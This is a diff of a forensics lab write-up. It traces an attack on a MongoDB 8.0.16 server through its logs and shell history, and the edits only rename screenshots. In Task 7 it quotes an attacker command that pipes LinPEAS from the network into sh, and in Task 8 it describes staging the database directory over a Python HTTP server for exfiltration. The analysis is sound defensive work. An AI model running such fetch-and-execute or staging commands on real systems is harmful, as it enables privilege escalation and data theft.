@@ -38,12 +38,14 @@ the server:
 grep -i "buildinfo" uac-mongodbsync-linux-triage/[root]/var/log/mongodb/mongod.log
 ```
 
-![Task 1](screenshots/Task%201.png)
+![Task 1 terminal output](screenshots/task1-terminal.png)
 
 The build info confirmed a MongoDB 8.0.16 deployment, which maps directly to a known,
 recently-disclosed remote authentication/BSON-parsing vulnerability affecting that release line.
 
 **Answer:** `CVE-2025-14847`
+
+![Task 1 answer](screenshots/task1-answer.png)
 
 ---
 
@@ -52,9 +54,11 @@ recently-disclosed remote authentication/BSON-parsing vulnerability affecting th
 Reusing the same `buildInfo` log entries from Task 1, the version field is visible directly in the
 JSON structure of the log line.
 
-![Task 2](screenshots/Task%202.png)
+![Task 2 terminal output](screenshots/task2-terminal.png)
 
 **Answer:** `8.0.16`
+
+![Task 2 answer](screenshots/task2-answer.png)
 
 ---
 
@@ -68,13 +72,15 @@ grep -E 'remote|conn|connection|BSON|zlib|InvalidBSON|errCode' \
   uac-mongodbsync-linux-triage/[root]/var/log/mongodb/mongod.log
 ```
 
-![Task 3](screenshots/Task%203.png)
+![Task 3 terminal output](screenshots/task3-terminal.png)
 
 A very high volume of accepted/ended connection pairs from a single external address stood out
 immediately, consistent with an automated brute-force/exploitation tool rapidly opening and closing
 connections.
 
 **Answer:** `65.0.76.43`
+
+![Task 3 answer](screenshots/task3-answer.png)
 
 ---
 
@@ -84,9 +90,11 @@ Scrolling to the first occurrence of the attacker's IP in the filtered connectio
 the very first "Connection accepted" entry for that address marks the start of the malicious
 activity.
 
-![Task 4](screenshots/Task%204.png)
+![Task 4 terminal output](screenshots/task4-terminal.png)
 
 **Answer:** `2025-12-29 05:25:52`
+
+![Task 4 answer](screenshots/task4-answer.png)
 
 ---
 
@@ -98,12 +106,14 @@ With the attacker's IP confirmed, I counted every log line referencing that remo
 grep -c '"remote":"65.0.76.43"' uac-mongodbsync-linux-triage/[root]/var/log/mongodb/mongod.log
 ```
 
-![Task 5](screenshots/Task%205.png)
+![Task 5 terminal output](screenshots/task5-terminal.png)
 
 The huge connection count is consistent with an automated brute-force/exploit script rapidly
 cycling connections against the exposed MongoDB port.
 
 **Answer:** `75260`
+
+![Task 5 answer](screenshots/task5-answer.png)
 
 ---
 
@@ -117,13 +127,15 @@ grep -E "Accepted password|Accepted publickey|session opened" \
   uac-mongodbsync-linux-triage/[root]/var/log/auth.log | tail -10
 ```
 
-![Task 6](screenshots/Task%206.png)
+![Task 6 terminal output](screenshots/task6-terminal.png)
 
 Two `mongoadmin` sessions were opened via `sshd` in quick succession. The second of these,
 immediately followed by hands-on-keyboard activity captured in the shell history (Tasks 7–8), is the
 session where the attacker began interacting with the box directly.
 
 **Answer:** `2025-12-29 05:40:03`
+
+![Task 6 answer](screenshots/task6-answer.png)
 
 ---
 
@@ -136,13 +148,15 @@ post-access activity:
 cat uac-mongodbsync-linux-triage/[root]/home/mongoadmin/.bash_history
 ```
 
-![Task 7](screenshots/Task%207.png)
+![Task 7 terminal output](screenshots/task7-terminal.png)
 
 The attacker piped LinPEAS directly into `sh` without ever writing it to disk — a classic
 in-memory privilege-escalation enumeration technique that avoids leaving an artifact on the
 filesystem.
 
 **Answer:** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
+
+![Task 7 answer](screenshots/task7-answer.png)
 
 ---
 
@@ -152,9 +166,11 @@ Reading further down the same `.bash_history` output from Task 7, the attacker's
 pattern (`cd /var/lib/mongodb/` → attempt to `zip` its contents → `python3 -m http.server 6969`)
 shows they staged the MongoDB data directory for exfiltration over a throwaway HTTP server.
 
-![Task 8](screenshots/Task%208.png)
+![Task 8 terminal output](screenshots/task8-terminal.png)
 
 **Answer:** `/var/lib/mongodb`
+
+![Task 8 answer](screenshots/task8-answer.png)
 
 ---
 
